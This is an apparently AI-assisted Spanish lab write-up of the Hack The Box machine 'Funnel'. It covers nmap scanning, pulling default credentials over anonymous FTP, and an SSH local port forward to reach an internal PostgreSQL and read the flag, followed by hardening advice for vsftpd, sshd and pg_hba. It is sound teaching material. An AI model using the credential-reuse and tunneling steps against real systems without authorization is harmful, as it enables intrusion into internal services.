---
title: Funnel (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, ftp, ssh, tunneling, postgresql, pivoting, port-forwarding]
type: nota
status: en-progreso
source: claude-code
aliases: [Funnel HTB, HTB Funnel, ssh port forwarding, ssh tunneling postgresql]
---

# Funnel — HTB Starting Point (Tier 1)

**Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: nmap, FTP anónimo, SSH local port forwarding, cliente psql**

Funnel combina dos patrones clásicos: credenciales expuestas por FTP anónimo y un servicio interno (PostgreSQL) que no es accesible desde fuera. El ataque consiste en leer las credenciales del FTP, luego crear un túnel SSH para alcanzar la base de datos interna y extraer la flag.

> Este writeup se realiza sobre la infraestructura legal y autorizada de Hack The Box (HTB Starting Point). No aplicar fuera de ese entorno.

---

## Objetivo

Leer credenciales filtradas por FTP anónimo, usar SSH local port forwarding para alcanzar PostgreSQL (que solo escucha en localhost del servidor), autenticarse con esas credenciales y recuperar la flag.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: port scanning / descubrimiento de servicios**

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Resultado esperado (resumido):

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd (versión varía)
22/tcp   open  ssh     OpenSSH (versión varía)
5432/tcp open  ...     (puede aparecer filtrado o cerrado desde exterior)
```

Lo que revela el escaneo:

- **Puerto 21 (FTP) abierto** — vsftpd con login anónimo habilitado. Señal inmediata de posible fuga de información.
- **Puerto 22 (SSH) abierto** — vector de tunneling una vez tengamos credenciales.
- **Puerto 5432 (PostgreSQL)** — accesible solo desde `localhost` del servidor, no desde el exterior. Por eso el objetivo no es atacar Postgres directamente, sino llegar a él a través de SSH.

> Ajusta los puertos según lo que devuelva nmap en vivo; la presencia de FTP anónimo y SSH es el dato clave.

---

## Enumeracion

**Categoría: FTP anónimo — fuga de credenciales / information disclosure**

El FTP anónimo no requiere contraseña real (usuario `anonymous`, password vacío o cualquier cadena):

```bash
ftp <IP>
# Name: anonymous
# Password: (Enter o cualquier texto)
```

Una vez dentro, listar el contenido:

```bash
ls -la
```

Busca archivos con nombres como `welcome.txt`, `notes.txt`, `credentials`, `README` o directorios de usuarios. Descarga todos:

```bash
get <nombre_de_archivo>
# o para descargar todo el directorio recursivo (si el servidor lo permite):
mget *
```

> Los nombres exactos de los archivos varían entre instancias. Descarga todo lo que encuentres y léelo localmente.

Lee los archivos descargados:

```bash
cat welcome.txt
cat *.txt
```

Los archivos suelen revelar:
- Una contraseña por defecto (p.ej. `funnel123#!` o similar — **confirma en vivo**, no uses este valor a ciegas).
- Nombres de usuario o pistas sobre qué usuarios existen en el sistema.

Con esa información tienes: **credencial candidata** + **usuario candidato** para SSH.

---

## Acceso inicial (foothold)

**Categoría: SSH con credenciales obtenidas + local port forwarding (tunneling)**

El patrón tiene dos pasos porque PostgreSQL no es accesible desde el exterior.

### Paso 1 — Verificar acceso SSH con las credenciales del FTP

```bash
ssh <usuario>@<IP>
```

Sustituye `<usuario>` por el nombre de usuario encontrado en los archivos del FTP y usa la contraseña descubierta. Si el login tiene éxito, confirmas las credenciales y que el usuario existe.

### Paso 2 — Crear el túnel SSH (local port forwarding)

En lugar de conectarte a una shell remota interactiva, abres un túnel: el puerto `1234` de tu máquina local quedará conectado al puerto `5432` de `localhost` en el servidor remoto.

```bash
ssh -L 1234:localhost:5432 <usuario>@<IP>
```

Desglose del comando:
- `-L 1234:localhost:5432` — "escucha en mi puerto local 1234; reenvía el tráfico a `localhost:5432` tal como lo ve el servidor remoto"
- El túnel permanece activo mientras la sesión SSH esté abierta; déjala en una terminal aparte.

### Paso 3 — Conectar a PostgreSQL a través del túnel

En otra terminal (o en la misma si usas `-f -N` para poner el túnel en background):

```bash
psql -h localhost -p 1234 -U postgres
```

- `-h localhost` — conecta a tu propio loopback (el túnel lo redirige al servidor remoto)
- `-p 1234` — el puerto local que elegiste en el paso anterior
- `-U postgres` — usuario de PostgreSQL; prueba también el usuario encontrado en el FTP si `postgres` falla

Usa la misma contraseña descubierta en el FTP.

### Paso 4 — Enumerar la base de datos y leer la flag

Una vez dentro del prompt `postgres=#`:

```sql
-- Listar bases de datos
\l

-- Conectar a la base de datos relevante (la que no sea postgres/template0/template1)
\c <nombre_bd>

-- Listar tablas
\dt

-- Leer el contenido
SELECT * FROM <nombre_tabla>;
```

> Los nombres de base de datos y tabla varían. Usa `\l` y `\dt` para descubrirlos en vivo antes de hacer el SELECT.

---

## Escalada de privilegios

No requiere privesc: la flag se obtiene directamente desde la sesión de PostgreSQL a través del túnel SSH, sin necesidad de escalar privilegios en el sistema operativo.

---

## Flags

| Flag | Ubicacion |
|---|---|
| unica flag | Tabla interna de la base de datos PostgreSQL accesible via tunel SSH |

```sql
-- Secuencia orientativa (ajusta nombres en vivo)
\l
\c secrets
\dt
SELECT * FROM flag;
```

Valor de la flag: `<flag>`

La flag tiene formato HTB estándar. Introdúcela en la plataforma para validar la máquina.

---

## Patron y teoria

**Esta seccion es la mas importante.**

### Patron 1: FTP anonimo como vector de fuga de informacion

**Categoria: Information Disclosure — CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)**

FTP anónimo existe para compartir ficheros públicos (distribuciones de software, documentos públicos). El error es dejar en el mismo servidor —o directorio— archivos que contienen credenciales, configuraciones internas o instrucciones de onboarding con passwords por defecto.

El atacante no necesita explotar ninguna vulnerabilidad de software: el servidor funciona exactamente como está configurado. El fallo es de proceso (política de contenidos del FTP) y de diseño (contraseñas por defecto que los usuarios no cambian).

### Patron 2: SSH local port forwarding para alcanzar servicios internos

**Categoria: Pivoting / Tunneling — técnica T1572 (Protocol Tunneling) en MITRE ATT&CK**

Este es el patron central y el mas valioso de esta maquina.

**El problema desde el punto de vista del atacante:** PostgreSQL escucha solo en `127.0.0.1:5432` del servidor. Desde fuera no hay ruta directa. Sin embargo, SSH (puerto 22) sí es accesible, y SSH permite crear túneles cifrados que reenvían tráfico arbitrario.

**El mecanismo:**

```
[Tu maquina] ──SSH cifrado──> [Servidor remoto]
    :1234 (local)                  :5432 (postgres interno)
```

El flag `-L` de SSH significa "Local port forwarding": el daemon SSH del servidor actúa como proxy, tomando las conexiones que llegan a tu puerto local y reenvíandolas a la dirección destino desde su perspectiva.

```bash
# Sintaxis general
ssh -L <puerto_local>:<host_destino_desde_servidor>:<puerto_destino> <usuario>@<servidor>

# Ejemplo con Funnel
ssh -L 1234:localhost:5432 <usuario>@<IP>
# Ahora: psql -h localhost -p 1234  ==  conectar a postgres en el servidor
```

Variaciones del mismo patrón que debes conocer:

| Tecnica | Comando | Cuando usarla |
|---|---|---|
| Local port forward | `ssh -L local:host:remoto user@servidor` | Acceder a un servicio interno del servidor desde tu máquina |
| Remote port forward | `ssh -R remoto:host:local user@servidor` | Exponer tu servicio local a través del servidor (reverse tunnel) |
| Dynamic (SOCKS proxy) | `ssh -D 1080 user@servidor` | Pivoting completo: enrutar tráfico arbitrario a través del servidor |

En engagements reales, este patrón aparece en la fase de "pivoting": el atacante compromete un host perimetral y desde ahí accede a la red interna que antes era inalcanzable.

### Como se defiende / diseña para evitarlo (purple team / dev)

**Contra la fuga de credenciales por FTP:**

```bash
# Si necesitas FTP anonimo, configura chroot estricto y permisos de solo lectura
# en vsftpd.conf:
anonymous_enable=YES
anon_root=/srv/ftp/public   # directorio exclusivo, nunca compartido con configs
write_enable=NO
anon_upload_enable=NO
```

- Nunca coloques archivos con contraseñas en directorios accesibles por FTP anónimo.
- Elimina contraseñas por defecto en todos los sistemas antes de desplegarlos. Si necesitas distribuir credenciales iniciales, hazlo por canal cifrado y fuerza cambio en primer login.
- Audita regularmente qué hay en el FTP: `find /srv/ftp -type f | xargs grep -l -i "password\|passwd\|secret\|credential"`.

**Contra el tunneling no autorizado:**

```
# En sshd_config, limita a quienes pueden hacer port forwarding:
AllowTcpForwarding no          # deshabilita por defecto
Match User deploy_user         # habilita solo para usuarios específicos
    AllowTcpForwarding yes
```

- Segmenta la red: PostgreSQL en un segmento de datos al que el servidor SSH no tenga acceso directo, o usa un bastion host dedicado con logging de sesiones.
- Monitoriza conexiones inusuales desde el servidor hacia servicios internos (p.ej. netflow o auditd con conexiones salientes de procesos sshd).

**Defensa en profundidad para la base de datos:**

```sql
-- Aunque postgres no sea accesible desde fuera, fuerza autenticacion fuerte
-- en pg_hba.conf: nunca "trust", siempre "md5" o "scram-sha-256"
local   all   all   scram-sha-256
host    all   all   127.0.0.1/32   scram-sha-256
```

- Usa contraseñas distintas para cada servicio. Si la contraseña del FTP == la contraseña de Postgres == la contraseña SSH, un único punto de fuga compromete todo.
- Principio de mínimo privilegio: el usuario de aplicacion en Postgres no debe ser `postgres` (superusuario).

### Generalizacion

El patrón "servicio interno no accesible + SSH disponible = tunneling" reaparece constantemente:

- Elasticsearch / Kibana en `localhost:9200` detrás de un servidor con SSH.
- Bases de datos internas (MySQL, Redis, MongoDB) en redes privadas con un jumphost SSH accesible.
- Paneles de administración (Grafana, RabbitMQ management) que escuchan en loopback.

La lección de diseño: **la segmentación de red no es suficiente si el host perimetral tiene acceso SSH con credenciales débiles o reutilizadas**. El atacante usa el propio mecanismo de acceso legítimo (SSH) para saltarse la segmentación.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[03-seguridad-de-redes]] — segmentación de red, firewalling, el modelo de confianza que rompe el tunneling
- — defensa central: usuarios dedicados por servicio, contraseñas no reutilizadas
- — cómo distribuir credenciales iniciales sin exponerlas en FTP
